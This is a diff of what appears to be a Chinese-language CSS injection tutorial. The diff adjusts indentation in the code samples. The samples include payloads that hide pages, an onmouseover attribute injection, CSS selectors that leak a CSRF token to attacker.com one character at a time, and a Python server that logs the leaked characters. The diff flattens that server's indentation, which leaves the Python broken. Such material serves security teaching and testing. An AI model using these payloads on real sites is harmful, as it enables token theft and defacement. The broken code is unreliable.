@@ -35,13 +35,13 @@ CSS注入是一种代码注入攻击，攻击者向Web页面注入恶意的CSS�
 ```
 # 用户输入直接嵌入 <style> 标签
 <style>
-  body { background: red; }
-  [INPUT_HERE]
+ body { background: red; }
+ [INPUT_HERE]
 </style>
 
 # Payload
-}  /* 闭合前面的规则 */
-body { display: none; }  /* 隐藏整个页面 */
+} /* 闭合前面的规则 */
+body { display: none; } /* 隐藏整个页面 */
 ```
 
 ### 类型2：选择器注入
@@ -49,7 +49,7 @@ body { display: none; }  /* 隐藏整个页面 */
 ```
 # CSS选择器由用户控制
 <style>
-  [INPUT_HERE] { color: red; }
+ [INPUT_HERE] { color: red; }
 </style>
 
 # Payload（注入属性选择器，利用URL外泄）
@@ -62,7 +62,7 @@ body { display: none; }  /* 隐藏整个页面 */
 ```
 # 属性值由用户控制
 <style>
-  body { background: [INPUT_HERE]; }
+ body { background: [INPUT_HERE]; }
 </style>
 
 # Payload
@@ -128,8 +128,8 @@ x" onmouseover="alert(1)"
 
 ```html
 <style>
-  .theme { color: blue; }
-  [INPUT]
+ .theme { color: blue; }
+ [INPUT]
 </style>
 
 <!-- Payload -->
@@ -144,7 +144,7 @@ x" onmouseover="alert(1)"
 
 ```html
 <style>
-  [INPUT]
+ [INPUT]
 </style>
 
 <!-- Payload：
@@ -160,18 +160,18 @@ x" onmouseover="alert(1)"
 
 ```html
 <style>
-  [INPUT]
+ [INPUT]
 </style>
 
 <!-- Payload（逐字符泄露CSRF Token） -->
 input[name="csrf_token"][value^="0"] { 
-  background-image: url(https://attacker.com/char?0); 
+ background-image: url(https://attacker.com/char?0); 
 }
 input[name="csrf_token"][value^="1"] { 
-  background-image: url(https://attacker.com/char?1); 
+ background-image: url(https://attacker.com/char?1); 
 }
 input[name="csrf_token"][value^="a"] { 
-  background-image: url(https://attacker.com/char?a); 
+ background-image: url(https://attacker.com/char?a); 
 }
 /* ... 覆盖所有可能的字符 (0-9, a-f 共16条) ... */
 
@@ -273,15 +273,15 @@ import http.server
 import re
 
 class CSSExfilServer(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        path = self.path
-        match = re.search(r'/char\?(.+)', path)
-        if match:
-            char = match.group(1)
-            print(f"[+] Leaked: {char}")
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"body { }")
+ def do_GET(self):
+ path = self.path
+ match = re.search(r'/char\?(.+)', path)
+ if match:
+ char = match.group(1)
+ print(f"[+] Leaked: {char}")
+ self.send_response(200)
+ self.end_headers()
+ self.wfile.write(b"body { }")
 
 server = http.server.HTTPServer(('0.0.0.0', 8080), CSSExfilServer)
 print("[*] CSS Exfil Server on :8080")
